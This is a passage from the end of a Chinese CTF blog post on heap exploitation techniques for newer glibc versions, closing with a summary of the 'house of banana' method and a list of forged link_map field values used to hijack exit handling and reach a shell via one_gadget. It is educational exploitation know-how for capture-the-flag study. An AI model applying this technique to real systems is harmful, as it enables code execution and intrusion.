class="number">0138</span>│  <span class="number">0x55a656f073d8</span> ◂— <span class="number">0x41</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后我们就是利用 onegadget 获得 shell 了。</p>
<p>利用 gdb 万能必挂点，结合 one_gadget 工具帮助我们快速找到合适的 one_gadget</p>
<p><img data-src="https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922124913109.png" alt="image-20220922124913109"></p>
<h5 id="一些注意点"><a class="markdownIt-Anchor" href="#一些注意点">#</a> 一些注意点：</h5>
<p>​	因为_rtld_global 这个符号是存在与 ld.so 文件中，往往出题人不会给出 ld.so 文件，，rtld_global_ptr 与 libc_base 的偏移在本地与远程并不是固定的，可能会在地址的第 2 字节处发生变化，因此可以爆破 256 种可能得到远程环境的精确偏移</p>
<h2 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结：</h2>
<p>​		本文主要就是介绍我们常用的手法，在高版本的利用情况，主要关注的是在较新版本 Glibc-2.34 0ubuntu3.2 的可行性。因为 2.34 主要问题还是在于一些 hook 函数被禁止，以及对_IO_str_finish、_IO_str_overflow 变化的影响，导致我们可以利用的点是在是很少了。但是这其实对于各位 ctfer 来讲，因为方法很少，导致攻击手法比较的单一，只有那么几个可以使用。在 3.2 版本之前，我们依旧可以通过修改 vtable 劫持控制流，或者攻击’exit_hook’(这个叫法可能会不太严谨，因为并不是一个 hook 的符号，而是其他的符号)。house of kiwi, 攻击 exit_hook 依旧是可以实现，且比较方便的。</p>
<p>​	后面我这里主要介绍了 house of banana, 这项技术，依旧是用于 3.2，并且向下兼容。简要概括，就是修改第三个节点的 l_next 为堆地址 fake，并在该堆上伪造第四个节点。</p>
<p>伪造 link_map</p>
<ol>
<li>​				 *(fake+0x28)=fake。</li>
<li>​				*(fake +0x48)=fake+0x58,   *(fake+0x50) = 0x8</li>
<li>​				*(fake+0x58) = shell</li>
<li>​				*(fake+0x110) = fake+0x40</li>
<li>​				*(fake+0x120) = fake+0x48</li>
<li>​				(int)*(fake+0x31c) = 0x9</li>
</ol>
<p>最后笔者在这里提出一个未完成的验证，house of emma 在 3.2 版本下的利用.</p>
<p>​		因为个人实力依旧比较菜，文章出可能会出现错误及不足，欢迎斧正。也希望能和对此文感兴趣的师傅进一步交流关于新版本的利用姿势。</p>
<p>​	[参考]：</p>
<p>​	想到验证各种姿势，感谢<span class="exturl" data-url="aHR0cHM6Ly9ydWFuNzc3LmdpdGh1Yi5pby8="> ru7n</span> 师傅</p>
<p>​	3.2 下攻击 exit_hook 的思考，感谢<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjQ4Mzc4Nz90eXBlPWJsb2c="> Ayaka</span> 师傅</p>
<p>​	house of banana 的最初构想	感谢<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL21lbWJlci8xNDY4Nzg="> ha1vk</span> 师傅</p>

      <div class="tags">
          <a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i> pwn</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-09-22 12:51:34" itemprop="dateModified" datetime="2022-09-22T12:51:34+08:00">2022-09-22</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/" title="高版本glibc堆的几种利用手法">http://example.com/2022/06/03/高版本glibc堆的几种利用手法/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/05/13/pwnable-re-alloc/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipevo9j1jj20zk0m8e81.jpg" title="pwnable-re-alloc">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> pwn</span>
  <h3>pwnable-re-alloc</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipew8gmvyj20zk0m87wh.jpg" title="vm学习笔记">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>vm学习笔记</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc-%E9%AB%98%E7%89%88%E6%9C%AC"><span class="toc-number">1.</span> <span class="toc-text"> Glibc 	高版本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#234235-%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.34 (2.35) 如何利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%AF%B9%E6%AF%94"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 一些对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#_io_str_finish"><span class="toc-number">1.2.1.1.</span> <span class="toc-text"> _IO_str_finish</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#_io_str_overflow"><span class="toc-number">1.2.1.2.</span> <span class="toc-text"> _IO_str_overflow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">1.2.1.3.</span> <span class="toc-text"> house of kiwi</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.2.1.4.</span> <span class="toc-text"> 小结：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">1.3.</span> <span class="toc-text"> 解决方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-banana"><span class="toc-number">1.3.1.</span> <span class="toc-text"> house of banana</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exit-_dl_fini-fini_t-arrayi"><span class="toc-number">1.3.1.0.1.</span> <span class="toc-text"> exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">1.3.1.0.2.</span> <span class="toc-text"> 一些注意点：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text"> 总结：</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="dreamcat"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">dreamcat</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">32</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/05/13/pwnable-re-alloc/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/06/21/ciscn-2022-whatheap/" title="ciscn_2022_whatheap">ciscn_2022_whatheap</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/" title="逆向常见算法">逆向常见算法</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/03/22/tw2017parrot/" title="tw2017parrot">tw2017parrot</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/06/27/%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0-%E2%80%94%E2%80%94%E4%B8%80/" title="学习周记 ——一">学习周记 ——一</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/14/heap-paradise/" title="heap_paradise">heap_paradise</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/" title="glibc-2.35一些手法">glibc-2.35一些手法</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/kernel/" title="In kernel">kernel</a>
</div>

    <span><a href="/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/" title="强网杯2018_core">强网杯2018_core</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/" title="高版本glibc堆的几种利用手法">高版本glibc堆的几种利用手法</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/kernel/" title="In kernel">kernel</a>
</div>

    <span><a href="/2022/05/02/ciscn-babydriver/" title="ciscn_babydriver">ciscn_babydriver</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/25/MRCTF-ezbash/" title="MRCTF_ezbash">MRCTF_ezbash</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="Symbols count total">282k words</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="Reading time total">4:16</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/06/03/高版本glibc堆的几种利用手法/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)dreamcat?"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
